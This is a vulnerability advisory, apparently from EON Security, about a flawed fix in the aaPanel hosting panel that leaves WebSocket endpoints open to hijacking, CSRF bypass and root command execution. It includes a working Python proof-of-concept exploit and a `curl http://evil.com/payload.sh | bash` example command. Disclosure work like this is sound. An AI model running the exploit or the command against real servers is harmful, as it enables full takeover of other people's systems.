# aaPanel: Vendors Don't Always Fix Things Properly

An incomplete fix for CVE-2021-37840 still exposes 3.6M servers to root RCE, 5 years later

**Discovered by:** EON Security  
**CVE:** Pending assignment  
**CVSS:** 8.8 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H  
**Affected:** aaPanel versions 6.8.12 through 7.65.0 (every version since the 2021 fix)  
**Installed base:** 3.6M+ servers  

---

## The Short Version

In 2021, a Cross-Site WebSocket Hijacking vulnerability (CVE-2021-37840) was disclosed in aaPanel, a free hosting control panel running on 3.6M+ servers. The vendor added a CSRF token check to "fix" it.

**The fix was architecturally wrong.**

Instead of rejecting unauthenticated WebSocket connections at the HTTP level (returning 401), the fix allows every connection through (returns 101 Switching Protocols) and only checks authentication inside the handler — after the WebSocket is already established. The CSRF check they added can be bypassed in multiple ways.

EON Security found that 5 years later, every aaPanel version is still vulnerable to the same attack class.

This is only the **10th CVE ever** assigned to aaPanel in its 6+ year history.

---

---

## What This Means in Plain English

If you run aaPanel, here's what an attacker can do to you:

**Scenario 1: An admin clicks a bad link**
1. Someone on your team clicks a link they shouldn't (email, ad, message)
2. That page secretly opens a WebSocket connection to your aaPanel — your browser includes your login cookie automatically because you're already logged in
3. aaPanel sees a valid session and lets the connection through — auth passes
4. The attacker sends `curl http://evil.com/payload.sh | bash` — that command runs as **root** on your server
5. Your server is now fully compromised: websites stolen, databases wiped, malware served to your visitors

Only one click needed. One mistaken click and the attacker owns everything.

**Scenario 2: An API key leaks**
1. An API key ends up somewhere it shouldn't — in a public GitHub repo, a config backup, a developer's notes
2. The attacker authenticates with that key and opens a WebSocket to aaPanel
3. The CSRF check sees "this is an API-authenticated request" and **skips the check entirely** — that's a hard bypass built into the code
4. The attacker runs commands as root immediately
5. No admin clicks, no warnings, no logs that look unusual — just instant compromise

This is the bigger problem. The CSRF protection doesn't apply to API-authenticated requests at all. It was designed to check browser-based connections, but the code path for API access bypasses it completely.

**Either way, 3.6 million servers are affected. Every version since 2021.**

1. **All 10 WebSocket endpoints accept connections before verifying who you are** — returns HTTP 101 Switching Protocols before checking authentication
2. **The CSRF check has hard bypass conditions** — `g.api_request=True` (API-authenticated requests) and `g.is_aes=True` (AES-encrypted requests) skip the check entirely
3. **The `/sock_shell` endpoint executes arbitrary commands** — `subprocess.Popen(cmd + " 2>&1", shell=True)`
4. **The `/webssh` endpoint accepts attacker-supplied SSH credentials** — connect to any SSH host
5. **Runs as root** — full server compromise

---

## Vulnerability Details

### 1. WebSocket Endpoints Accept Connections Before Auth

All WebSocket endpoints return HTTP 101 Switching Protocols **before** any authentication check. The `comm.local()` auth check runs inside the handler, after the WebSocket upgrade is already complete:

```python
@sockets.route('/sock_shell')
def sock_shell(ws):
    comReturn = comm.local()     # ← Auth check happens AFTER 101
    if comReturn:
        ws.send(str(comReturn))
        return
```

Affected endpoints:
- `/webssh` (SSH terminal proxy)
- `/sock_shell` (direct command execution)
- `/ws_panel` (panel management)
- `/ws_home` (dashboard)
- `/ws_project` (project management)
- `/ws_model` (model management)
- `/workorder_client` (ticket system)
- `/v2/*` variants of all above

### 2. CSRF Token Check Bypass

The `check_csrf_websocket()` function is designed to prevent Cross-Site WebSocket Hijacking:

```python
def check_csrf_websocket(ws, args):
    if g.is_aes: return True        # ← Bypass: AES mode skips check
    if g.api_request: return True    # ← Bypass: API requests skip check
    if public.is_debug(): return True
    is_success = True
    if not 'x-http-token' in args:
        is_success = False
    if is_success:
        if public.get_csrf_sess_html_token_value() != args['x-http-token']:
            is_success = False
    if not is_success:
        ws.send('token error')
        return False
    return True
```

Two hard bypass conditions exist:
- **`g.api_request`**: When True (set during API key authentication), the CSRF check is entirely skipped. Any API-authenticated WebSocket session bypasses this protection.
- **`g.is_aes`**: When True (set during AES-encrypted API requests), the CSRF check is also skipped.

The token comparison (`get_csrf_sess_html_token_value()`) returns `session.get('request_token_head', "")`. In sessions where this value is not yet initialized, an empty `x-http-token` passes the check.

### 3. Command Execution via sock_shell

The `/sock_shell` endpoint passes attacker-supplied strings directly to `subprocess.Popen` with `shell=True`:

```python
def sock_recv(cmdstring, ws):
    p = subprocess.Popen(cmdstring + " 2>&1",
                         close_fds=True,
                         shell=True,           # ← Arbitrary command execution
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
```

Each message received on the WebSocket is executed as a shell command. Output is streamed back via WebSocket. Since aaPanel runs as root, this is **full system compromise**.

### 4. SSH Proxy via webssh

The `/webssh` endpoint accepts attacker-supplied SSH connection parameters from the first WebSocket message:

```python
ssh_info['host'] = get['host'].strip()
ssh_info['port'] = int(get['port'])
ssh_info['username'] = get['username'].strip()
ssh_info['password'] = get['password'].strip()
```

If the host is `127.0.0.1` or `localhost`, the handler checks the database for saved credentials, or uses attacker-supplied ones.

---

## Attack Scenario

The primary exploit path is **CSWSH (Cross-Site WebSocket Hijacking)** requiring user interaction:

1. Administrator has an active aaPanel session (logged in)
2. Administrator visits a malicious webpage
3. The page opens a WebSocket to `wss://victim-panel:8888/sock_shell`
4. Browser automatically includes the session cookie
5. `comm.local()` passes authentication (valid session cookie)
6. The attacker sends `{"x-http-token": ""}` or exploits API/AES bypass paths
7. If CSRF check passes, commands can be executed as root

**Alternative path via API key compromise:**
1. Attacker obtains valid aaPanel API key
2. API-authenticated requests set `g.api_request = True`
3. CSRF check is skipped entirely for these requests
4. Direct command execution via WebSocket without user interaction

---

## Affected Endpoints

| Endpoint | Function | Impact |
|----------|----------|--------|
| `/webssh` | SSH terminal proxy | Connect to arbitrary SSH hosts with attacker credentials |
| `/sock_shell` | Direct command execution | **RCE as root** via shell commands |
| `/ws_panel` | Panel management | Panel data access |
| `/ws_home` | Dashboard | Dashboard data access |
| `/ws_project` | Project management | Project data access |
| `/ws_model` | Model management | Model data access |
| `/workorder_client` | Ticket system | Ticket data access |
| `/v2/*` | All v2 variants | Same as above |

---

## PoC

```python
import asyncio, json, ssl
import websockets

async def exploit(target, command):
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    async with websockets.connect(
        f"wss://{target}/sock_shell", ssl=ssl_context
    ) as ws:
        # Attempt CSRF bypass with empty token
        await ws.send(json.dumps({"x-http-token": ""}))
        resp = await asyncio.wait_for(ws.recv(), timeout=10)
        
        if "token error" in resp:
            # CSRF check active — may need API auth bypass
            return None
        
        # Execute command
        await ws.send(command)
        return await asyncio.wait_for(ws.recv(), timeout=30)
```

Full PoC: [exploit.py](exploit.py)

---

## Detection

Use the [check.py](check.py) script to test if an aaPanel instance has vulnerable WebSocket endpoints:

```bash
python3 check.py https://target:8888
```

---

## Mitigation

1. **Check authentication BEFORE accepting WebSocket upgrades** — return HTTP 401 at handshake level, not after
2. **Remove hard bypass conditions** — `g.api_request` and `g.is_aes` should not skip CSRF protection
3. **Validate Origin header** on WebSocket upgrade — reject unrecognized origins
4. **Disable sock_shell** if not required — provides direct root command execution
5. **Restrict network access** to aaPanel administration interface

---

## Timeline

| Date | Event |
|------|-------|
| 2021-08-02 | CVE-2021-37840 disclosed (aaPanel CSWSH) |
| 2021 | Vendor adds `check_csrf_websocket()` as fix |
| 2026-06-23 | EON Security discovers fix is incomplete |
| Pending | CVE assignment |
| Pending | Public disclosure |

---

## References

- [CVE-2021-37840](https://nvd.nist.gov/vuln/detail/CVE-2021-37840) — Original aaPanel CSWSH
- [CVE-2026-29859](https://nvd.nist.gov/vuln/detail/CVE-2026-29859) — aaPanel arbitrary file upload (Mar 2026)
- [aaPanel GitHub](https://github.com/aaPanel/aaPanel) — Official repository
- [EON Security](https://eonsecurity.co.za) — Discoverer

---

## Credit

**Yadav** — EON Security  
Website: [https://eonsecurity.co.za](https://eonsecurity.co.za)

---

## License

This content is licensed under MIT. The PoC is provided for educational and defensive purposes only.
